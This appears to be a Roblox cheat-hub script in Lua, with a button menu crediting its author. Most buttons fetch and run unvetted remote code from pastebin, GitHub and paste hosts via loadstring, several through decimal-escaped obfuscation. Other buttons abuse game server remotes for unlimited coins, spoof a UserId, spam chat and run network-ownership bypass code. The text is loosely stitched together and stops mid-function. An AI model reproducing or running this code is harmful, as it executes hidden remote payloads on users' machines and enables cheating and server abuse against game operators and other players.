Section:NewButton("Survive the killers Chair wave (Not area 51)", "Survive The Killers✔️", function()
    local games = {
 
    ["SurviveTheKiller"] = 4580204640
 
}
 
for i,v in pairs(games) do
    if game.PlaceId == v then print("Supported!"); loadstring(game:HttpGet("https://raw.githubusercontent.com/MiloHaxx/ChairWare/main/Games/" .. i .. ".lua"))() end
end
 
loadstring(game:HttpGet("https://raw.githubusercontent.com/MiloHaxx/ChairWare/main/dcJoin.lua"))()
end)

Section:NewButton("Break In", "forgor", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RubyBoo4life/break-in-v1/main/.gitignore"))();
end)
Section:NewButton("Murder Mystery 3", "ok", function()
    loadstring(game:HttpGet("https://pastebin.com/fedNtyaL"))
end)
Section:NewButton("Murder Mystery 4", "you handsome", function()
    loadstring(game:HttpGet("https://pastebin.com/aCrpc6SW"))
end)
Section:NewLabel("Hello")

Section:NewLabel("Henlo guys")

Section:NewLabel("Hope you have a good day")

Section:NewLabel("Have Fun With The script")

End1Section:NewButton("Bobo Hub", "okeh", function()
    loadstring("\108\111\99\97\108\32\76\105\98\114\97\114\121\32\61\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\118\102\102\49\98\81\57\70\34\41\41\40\41\10\108\111\99\97\108\32\87\105\110\100\111\119\32\61\32\76\105\98\114\97\114\121\46\67\114\101\97\116\101\76\105\98\40\34\66\111\98\111\32\72\117\98\34\44\32\34\77\105\100\110\105\103\104\116\34\41\10\10\45\45\32\84\97\98\115\10\10\108\111\99\97\108\32\84\97\98\32\61\32\87\105\110\100\111\119\58\78\101\119\84\97\98\40\34\77\105\115\99\34\41\10\108\111\99\97\108\32\83\101\99\116\105\111\110\32\61\32\84\97\98\58\78\101\119\83\101\99\116\105\111\110\40\34\99\111\111\108\34\41\10\10\45\45\32\66\117\116\116\111\110\115\10\10\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\65\110\105\109\97\116\105\111\110\32\67\104\97\110\103\101\114\34\44\32\34\73\116\32\99\104\97\110\103\101\115\32\116\104\101\32\97\110\105\109\97\116\105\111\110\32\119\97\108\107\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\82\117\98\121\66\111\111\52\108\105\102\101\47\83\99\114\105\112\116\115\47\109\97\105\110\47\97\110\105\109\97\116\105\111\110\115\46\118\105\115\39\41\41\40\41\10\101\110\100\41\10\10\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\70\108\105\110\103\32\89\69\69\84\32\71\85\73\34\44\32\34\67\114\101\100\105\116\32\116\111\32\116\104\101\32\79\119\110\101\114\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\115\97\77\116\105\101\107\50\34\44\116\114\117\101\41\41\40\41\10\101\110\100\41\10\10\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\83\112\101\101\100\32\84\111\111\108\34\44\32\34\84\104\105\115\32\116\111\111\108\32\109\97\107\101\115\32\117\32\102\97\115\116\101\114\32\105\102\32\121\111\117\32\99\108\105\99\107\34\44\32\102\117\110\99\116\105\111\110\40\41\10\109\111\117\115\101\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\58\71\101\116\77\111\117\115\101\40\41\10\116\111\111\108\32\61\32\73\110\115\116\97\110\99\101\46\110\101\119\40\34\84\111\111\108\34\41\10\116\111\111\108\46\82\101\113\117\105\114\101\115\72\97\110\100\108\101\32\61\32\102\97\108\115\101\10\116\111\111\108\46\78\97\109\101\32\61\32\34\67\108\105\99\107\32\84\111\32\83\112\101\101\100\32\85\112\34\10\116\111\111\108\46\65\99\116\105\118\97\116\101\100\58\99\111\110\110\101\99\116\40\102\117\110\99\116\105\111\110\40\41\10\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\49\48\48\10\101\110\100\41\10\116\111\111\108\46\80\97\114\101\110\116\32\61\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\66\97\99\107\112\97\99\107\10\101\110\100\41\10\10\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\70\108\121\32\86\51\34\44\32\34\116\104\101\121\32\97\100\100\101\100\32\100\101\115\116\114\111\121\32\103\117\105\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\97\100\115\116\114\105\110\103\40\34\92\49\48\56\92\49\49\49\92\57\55\92\49\48\48\92\49\49\53\92\49\49\54\92\49\49\52\92\49\48\53\92\49\49\48\92\49\48\51\92\52\48\92\49\48\51\92\57\55\92\49\48\57\92\49\48\49\92\53\56\92\55\50\92\49\49\54\92\49\49\54\92\49\49\50\92\55\49\92\49\48\49\92\49\49\54\92\52\48\92\51\52\92\49\48\52\92\49\49\54\92\49\49\54\92\49\49\50\92\49\49\53\92\53\56\92\52\55\92\52\55\92\49\49\52\92\57\55\92\49\49\57\92\52\54\92\49\48\51\92\49\48\53\92\49\49\54\92\49\48\52\92\49\49\55\92\57\56\92\49\49\55\92\49\49\53\92\49\48\49\92\49\49\52\92\57\57\92\49\49\49\92\49\49\48\92\49\49\54\92\49\48\49\92\49\49\48\92\49\49\54\92\52\54\92\57\57\92\49\49\49\92\49\48\57\92\52\55\92\55\57\92\49\50\50\92\53\54\92\52\56\92\52\56\92\53\54\92\52\55\92\49\48\50\92\49\48\51\92\53\49\92\52\55\92\49\48\57\92\57\55\92\49\48\53\92\49\49\48\92\52\55\92\49\48\51\92\49\49\55\92\49\48\53\92\51\52\92\52\49\92\52\49\92\52\48\92\52\49\92\49\48\34\41\40\41\10\101\110\100\41\10\10\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\84\114\97\110\115\108\97\116\111\114\34\44\32\34\115\117\115\115\121\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\73\116\115\82\104\121\108\101\101\47\110\97\109\101\47\109\97\105\110\47\108\97\110\103\117\97\103\101\34\41\41\40\41\10\101\110\100\41\10\32\10\32\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\80\101\114\109\97\110\101\110\116\32\65\110\105\109\97\116\105\111\110\34\44\32\34\108\111\108\34\44\32\102\117\110\99\116\105\111\110\40\41\10\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\73\116\115\82\104\121\108\101\101\47\98\114\117\104\47\109\97\105\110\47\112\101\114\109\34\41\41\40\41\10\32\101\110\100\41\10\32\10\45\45\32\84\97\98\115\10\10\108\111\99\97\108\32\84\97\98\32\61\32\87\105\110\100\111\119\58\78\101\119\84\97\98\40\34\77\97\105\110\34\41\10\108\111\99\97\108\32\83\101\99\116\105\111\110\32\61\32\84\97\98\58\78\101\119\83\101\99\116\105\111\110\40\34\72\101\39\115\32\78\111\111\98\34\41\10\10\45\45\66\117\116\116\111\110\115\10\10\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\73\110\102\105\110\105\116\101\32\74\117\109\112\34\44\32\34\79\77\71\32\73\32\67\65\78\32\70\76\89\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\70\105\85\97\119\121\86\122\34\41\41\40\41\59\10\101\110\100\41\10\10\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\83\104\105\102\116\108\111\99\107\34\44\32\34\70\114\101\101\32\83\104\105\102\116\108\111\99\107\32\58\68\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\87\81\57\78\80\101\68\83\39\41\41\40\41\59\10\101\110\100\41\10\10\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\75\101\121\98\111\97\114\100\34\44\32\34\84\104\105\115\32\105\115\32\116\104\101\32\98\101\116\116\101\114\32\111\110\101\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\107\67\51\100\65\77\118\116\34\41\41\40\41\10\101\110\100\41\10\10\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\65\117\116\111\67\108\105\99\107\101\114\34\44\32\34\105\116\32\119\111\114\107\32\115\111\109\101\32\103\97\109\101\115\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\73\116\115\82\104\121\108\101\101\47\97\104\104\97\104\47\109\97\105\110\47\97\104\104\97\104\97\104\97\104\104\110\114\105\115\106\101\105\97\111\115\109\101\105\115\107\115\106\115\106\101\106\115\109\109\115\34\41\41\40\41\10\101\110\100\41\10\32\32\10\45\45\77\111\114\101\32\72\117\98\32\40\67\114\101\100\105\116\41\10\10\108\111\99\97\108\32\84\97\98\32\61\32\87\105\110\100\111\119\58\78\101\119\84\97\98\40\34\77\111\114\101\32\72\117\98\115\34\41\10\108\111\99\97\108\32\83\101\99\116\105\111\110\32\61\32\84\97\98\58\78\101\119\83\101\99\116\105\111\110\40\34\67\114\101\100\105\116\115\32\116\111\32\116\104\101\32\111\119\110\101\114\115\34\41\10\10\45\45\66\117\116\116\111\110\115\10\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\74\78\32\72\72\32\71\97\109\105\110\103\32\66\101\100\119\97\114\115\32\72\117\98\34\44\32\34\67\114\101\100\105\116\32\116\111\32\104\105\109\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\74\78\72\72\71\97\109\105\110\103\49\50\51\47\74\78\45\66\101\100\119\97\114\115\45\86\54\47\54\99\56\102\100\48\50\51\100\53\48\101\50\53\102\56\57\51\99\97\51\52\51\50\50\52\53\56\98\101\51\50\97\48\98\97\99\52\99\53\47\74\78\37\50\48\66\101\100\119\97\114\115\37\50\48\86\54\34\41\41\40\41\10\101\110\100\41\10\32\10\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\86\72\117\98\34\44\32\34\84\104\105\115\32\72\117\98\32\73\115\32\67\111\111\108\34\44\32\102\117\110\99\116\105\111\110\40\41\10\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\105\116\115\121\97\98\111\105\118\105\110\99\101\110\116\116\53\51\49\53\47\115\99\114\105\112\116\47\109\97\105\110\47\86\72\117\98\46\116\120\116\39\41\44\116\114\117\101\41\41\40\41\10\32\101\110\100\41\10\32\10\32\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\67\97\114\108\32\72\117\98\34\44\32\34\67\114\101\100\105\116\32\116\111\32\104\105\109\34\44\32\102\117\110\99\116\105\111\110\40\41\10\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\99\97\114\108\99\111\100\101\100\47\99\97\114\108\105\115\112\114\111\47\109\97\105\110\47\99\97\114\108\104\117\98\39\41\41\40\41\10\32\101\110\100\41\10\32\10\32\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\85\110\107\110\111\119\110\32\72\117\98\32\40\67\76\73\67\75\32\84\72\69\32\51\32\68\79\84\83\41\34\44\32\34\75\101\121\58\70\105\110\97\108\108\121\86\50\73\115\79\117\116\34\44\32\102\117\110\99\116\105\111\110\40\41\10\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\112\97\115\116\101\46\101\101\47\114\47\119\82\78\50\50\34\44\116\114\117\101\41\41\40\41\10\32\101\110\100\41\10\32\10\32\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\83\111\109\101\111\110\101\32\72\117\98\34\44\32\34\115\104\101\101\115\104\32\99\114\101\100\105\116\32\116\111\32\104\105\109\34\44\32\102\117\110\99\116\105\111\110\40\41\10\32\95\71\46\67\111\108\111\114\32\61\32\67\111\108\111\114\51\46\102\114\111\109\82\71\66\40\48\44\50\53\53\44\48\41\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\107\105\99\107\84\104\47\83\67\82\73\80\84\45\83\79\77\69\45\88\45\72\85\66\47\109\97\105\110\47\82\69\65\68\77\69\46\109\100\34\41\40\41\10\101\110\100\41\10\32\10\45\45\66\101\100\119\97\114\115\10\108\111\99\97\108\32\84\97\98\32\61\32\87\105\110\100\111\119\58\78\101\119\84\97\98\40\34\66\101\100\119\97\114\115\34\41\10\108\111\99\97\108\32\83\101\99\116\105\111\110\32\61\32\84\97\98\58\78\101\119\83\101\99\116\105\111\110\40\34\69\110\106\111\121\33\34\41\10\10\83\101\99\116\105\111\110\58\78\101\119\66\117\116\116\111\110\40\34\65\110\116\105\75\110\111\99\107\98\97\99\107\34\44\32\34\69\90\34\44\32\102\117\110\99\116\105\111\110\40\41\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\71\100\75\105\110\101\122\106\39\41\41\40\41\59\10\101\110\100\41\10\10\45\45\80\108\97\121\101\114\10\10\108\111\99\97\108\32\84\97\98\32\61\32\87\105\110\100\111\119\58\78\101\119\84\97\98\40\34\80\108\97\121\101\114\34\41\10\108\111\99\97\108\32\83\101\99\116\105\111\110\32\61\32\84\97\98\58\78\101\119\83\101\99\116\105\111\110\40\34\69\110\106\111\121\34\41\10\10\83\101\99\116\105\111\110\58\78\101\119\84\111\103\103\108\101\40\34\70\111\118\34\44\32\34\67\104\97\110\103\101\115\32\70\111\118\34\44\32\102\117\110\99\116\105\111\110\40\115\116\97\116\101\41\10\32\32\32\32\105\102\32\115\116\97\116\101\32\116\104\101\110\10\32\32\32\32\32\32\32\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\67\117\114\114\101\110\116\67\97\109\101\114\97\46\70\105\101\108\100\79\102\86\105\101\119\32\61\32\49\50\48\10\32\32\32\32\32\101\108\115\101\10\32\32\32\32\32\32\32\32\103\97\109\101\46\87\111\114\107\115\112\97\99\101\46\67\117\114\114\101\110\116\67\97\109\101\114\97\46\70\105\101\108\100\79\102\86\105\101\119\32\61\32\56\48\10\32\32\32\32\101\110\100\10\101\110\100\41\10\10\83\101\99\116\105\111\110\58\78\101\119\84\111\111\103\108\101\40\34\83\112\101\101\100\34\44\32\34\105\109\32\102\97\115\116\101\114\32\116\104\97\110\32\117\32\108\111\108\34\44\32\102\117\110\99\116\105\111\110\40\115\116\97\116\101\41\10\32\32\32\105\102\32\115\116\97\116\101\32\116\104\101\110\10\32\32\32\32\32\32\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\55\48\10\32\32\32\32\101\108\115\101\10\32\32\32\32\32\32\32\103\97\109\101\46\80\108\97\121\101\114\115\46\76\111\99\97\108\80\108\97\121\101\114\46\67\104\97\114\97\99\116\101\114\46\72\117\109\97\110\111\105\100\46\87\97\108\107\83\112\101\101\100\32\61\32\50\48\10\32\32\32\32\32\32\101\110\100\10\101\110\100\41\10")()
end)
Section:NewButton("Raise A Granny", "I think this fe", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Balligusapos/Balligusapos/main/SUBTOBALLI"))()
end)
Section:NewButton("Infection Smile (Needs Big screen)", "ButtonInfo", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/WG1BMS72",true))()
end)
End1Section:NewButton("Op Feyz Hub", "some script dont work", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/bzmhRgKL"))();
end)
Section:NewButton("Da Hood Script Da Guix", "I always never forgot to update", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/xMilesGames/Da-Hood/main/README.md"))()
end)
Section:NewButton("Fe Chaos Gamepass", "Fe", function()
    game.Players.LocalPlayer.UserId = "2205774994"
end)
Section:NewButton("Da Hood Late v1", "Da hood script😁😁", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Impulseonyoutube/scripts/main/dahood"))()
end)
End1Section:NewButton("Dodo Hub op", "Fe", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/albibos/dodobird/main/openhub"))()
end)
Section:NewButton("Anti Afk gui (Anti Kick Afk)", "i dont know", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/2dgeneralspam1/scripts-and-stuff/master/scripts/LoadstringypVvhJBq4QNz", true))()
end)
Section:NewButton("Goal Kicking Simulator Op", "Cr", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/Scripts/main/GoalKickSimulator"))()
end)
Section:NewSlider("Speed But slider", "Hello there", 1000, 16, function(s) 
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)
Section:NewButton("Sing Rickroll😂", "never gonna give you up", function()
    local song = "Never Gonne Give You Up"

request = game:HttpGet("https://lyrics.flc.bar/search?song=" .. song)

decoded = game.HttpService:JSONDecode(request)

local lyrics = {}
for i in decoded.lyrics:gmatch("[^\r\n]+") do
   table.insert(lyrics, i)
end

for i, v in pairs(lyrics) do
   wait(3)
   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v, "All")
end
end)

Section:NewButton("Pro Border Gamepass team Change Fe", "r", function()
    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\51\119\101\114\114\54\107\85\10"))()
end)
Section:NewButton("Fe Crawling Spider Only R6 no hats needed", "idk", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/eMmgNCQV'))()
end)
End1Section:NewButton("Gaming Hub op", "made by Gs (GamingScripter)", function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/GamingScripter/gaming_hub/main/Gaming%20Hub")))()
end)
Section:NewButton("Fe Walk On walls🕷️🕸️", "Fe no netless needed", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
end)
LocalSection:NewTextBox("Set Jumppower","Increases JP", function(txt)
game.Players.LocalPlayer.Character.Humanoid.JumpPower = txt
end)
LocalSection:NewTextBox("Set Walkspeed","Rare kavo UI walkspeed setter", function(txt)
     game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = txt
end)
Section:NewButton("Netless Gui Only R6 scripts", "You 🥓", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/ULA6Y3gH", true))()
end)
Section:NewButton("Op Type Race Auto Type Fe", "ok", function()
    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\120\88\104\100\119\51\51\84\10"))()
end)
Section:NewButton("Untitled Hood Gui Trip Hub Fe", "🥇", function()
    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\71\97\109\101\114\69\109\105\108\105\97\110\111\70\70\47\116\114\105\112\95\47\109\97\105\110\47\72\117\98\10",true))()
end)
End1Section:NewButton("Selexity Hub Fe", "Anim gui Long loading", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/o5u3/Selexity/main/Main'),true))()
end)
Section:NewButton("Harshtech v7.1 Super Op", "This super duper extremely op", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/HarshTechV7.1-Gui/main/Scripts"))()
end)
End1Section:NewButton("IceHub (Brookhaven Rp Gui)", "Icemael", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven"))()
end)



End1Section:NewButton("Moon Hub", "😴", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/Gae7YC84"))();
end)
End1Section:NewButton("Gabx Hub", "ok", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/wDh1eTdX"))()
end)
End1Section:NewButton("Era Hub", "my data is expired bruh", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/zRWQnNjS'))()
end)
End1Section:NewButton("Ez Hub", "connection", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/debug420/Ez-Industries-Launcher-Data/master/Launcher.lua'),true))()
end)
End1Section:NewButton("Kzs Hub", "idk", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/KZSHUB/KZS-HUB/main/KZSHUBV1.5", true))()
end)
End1Section:NewButton("Frixon Hub", "ok", function()
    loadstring(game:HttpGet('https://gist.githubusercontent.com/RedoGaming/459eb467f3df927b07ca398a68f3b053/raw/6d1f7a2c8fefd072dc53ebbbec38c6f93c7de1ad/Frixon%2520Hub!%2520New%2520OP%2520Exploit%2520Hub%2520for%2520Roblox!'))()
end)
End1Section:NewButton("RageFlake Hub", "Ben", function()
    loadstring(game:HttpGet('https://gist.githubusercontent.com/RedoGaming/2e5943498c487ea97df0d436dd35c234/raw/f0445b1afcd9193bfb94bc75dda7318310a22ad2/Rageflake!%2520New%2520OP%2520Roblox%2520Exploit%2520Hub!'))()
end)



Section:NewButton("Toys trading Script", "Pro but dupe patched", function()
    loadstring(game:HttpGet("https://paste.ee/r/b7ZaW", true))()
end)



Tab1Section:NewLabel("Script is inspired by British hub And Red Ghost")

Tab1Section:NewLabel("Script Made by  Dylan_OnePunchMan and piinatas (Roblox accounts)")

Tab1Section:NewLabel("Script Name Inspired By my name Dylan")

Tab1Section:NewLabel("Hope You like this script✔️✔️✔️")




Tab1Section:NewLabel("My roblox Account Is Dylan_OnePunchMan")

Tab1Section:NewLabel("My other Roblox accounts Piinatas")

Tab1Section:NewLabel("Hello")


game:GetService("StarterGui"):SetCore("SendNotification",{
                Title = "Script Made by Dylan_OnePunchMan on roblox",
                Text = "Have Fun with the script 😄",
                Duration = 7,
                })
                
                
                
                
               
Tab1Section:NewLabel("Current Version is 1.7")






Section:NewButton("Op Dunkin simulator script", "Ok", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/oceanhong970201/robloxscript/main/Dunking%20Simulator.lua'),true))()
end)


Tab1Section:NewLabel("Whats more better harshtechv7.1 or British hub🤔")


print("Dyvan Gui successfully loaded!")

print("hello")

print("The reason why i created this script is because im very bored")

End1Section:NewButton("Script Hub (Break In Script)", "Break in", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nikita365/Break-In-Story-/main/Break%20In%20Story%20Hub"))()
end)

Section:NewButton("Tool Giver Gui (Touch People)", "Usefull", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/u3HnnnpD'))()
end)

Section:NewButton("Destruction Simulator inf money script fe", "Idk", function()
    while wait() do
    while wait() do
             game:GetService("ReplicatedStorage").Remotes.generateBoost:FireServer("Coins", 480, 99999999)
     end
end
end)

Window1Section:NewButton("Zombie Animation", "R15 animation", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
game.Players.LocalPlayer.Character.Humanoid.Jump = false
    end
end
end)

Window1Section:NewButton("Cartoony Animation", "R15 animation", function()
while true do
    wait(1)
    for i, player in ipairs(game.Players:GetChildren()) do
    local Animate = game.Players.LocalPlayer.Character.Animate
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
game.Players.LocalPlayer.Character.Humanoid.Jump = false
    end
end
end)


Section:NewButton("Unlock All guns big paintball fe", "Big paintball fe", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/GVvyGhpx'))()
end)

Section:NewButton("Shrek in the backrooms script", "made by balligusapo", function()
    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\110\106\120\66\100\102\67\76\10"))()
end)
Section:NewButton("DomaineX", "Script Hub 100+ game support", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/DomainX/main/source',true))()
end)


Section:NewButton("Amogus Script", " Works r6 only no hat needed", function()
    local netboost = 500069 --velocity 
--netboost usage: 
--set to false to disable
--set to a vector3 value if you dont want the velocity to change
--set to a number to change the velocity in real time with magnitude equal to the number
local idleMag = 0.005 --used only in case netboost is set to a number value
--if magnitude of the real velocity of a part is lower than this
--then the fake velocity is being set to Vector3.new(0, netboost, 0)
--the lower value the less you jitter but you might loose network ownership
local simradius = "shp" --simulation radius (net bypass) method
--"shp" - sethiddenproperty
--"ssr" - setsimulationradius
--false - disable
local antiragdoll = true --removes hingeConstraints and ballSocketConstraints from your character
local newanimate = false --disables the animate script and enables after reanimation
local discharscripts = true --disables all localScripts parented to your character before reanimation
local R15toR6 = true --tries to convert your character to r6 if its r15
local addtools = false --puts all tools from backpack to character and lets you hold them after reanimation
local loadtime = game:GetService("Players").RespawnTime + 0.5 --anti respawn delay
local method = 3 --reanimation method
--methods:
--0 - breakJoints (takes [loadtime] seconds to laod)
--1 - limbs
--2 - limbs + anti respawn
--3 - limbs + breakJoints after [loadtime] seconds
--4 - remove humanoid + breakJoints
--5 - remove humanoid + limbs
local alignmode = 2 --AlignPosition mode
--modes:
--1 - AlignPosition rigidity enabled true
--2 - 2 AlignPositions rigidity enabled both true and false
--3 - AlignPosition rigidity enabled false
local hedafterneck = true --disable aligns for head and enable after neck is removed
local lp = game:GetService("Players").LocalPlayer
local rs = game:GetService("RunService")
local stepped = rs.Stepped
local heartbeat = rs.Heartbeat
local renderstepped = rs.RenderStepped
local sg = game:GetService("StarterGui")
local ws = game:GetService("Workspace")
local cf = CFrame.new
local v3 = Vector3.new
local v3_0 = v3(0, 0, 0)
local inf = math.huge
local c = lp.Character
if not (c and c.Parent) then
    return
end
for i, v in pairs(c:GetDescendants()) do
    if v:IsA("CharacterMesh") or v:IsA("SpecialMesh") then
        v:Destroy()
    end
end
c:GetPropertyChangedSignal("Parent"):Connect(function()
    if not (c and c.Parent) then
        c = nil
    end
end)
local function gp(parent, name, className)
	local ret = nil
	pcall(function()
		for i, v in pairs(parent:GetChildren()) do
			if (v.Name == name) and v:IsA(className) then
				ret = v
				break
			end
		end
	end)
	return ret
end
local function align(Part0, Part1)
	Part0.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0.0001, 0.0001, 0.0001, 0.0001)
	local att0 = Instance.new("Attachment", Part0)
	att0.Orientation = v3_0
	att0.Position = v3_0
	att0.Name = "att0_" .. Part0.Name
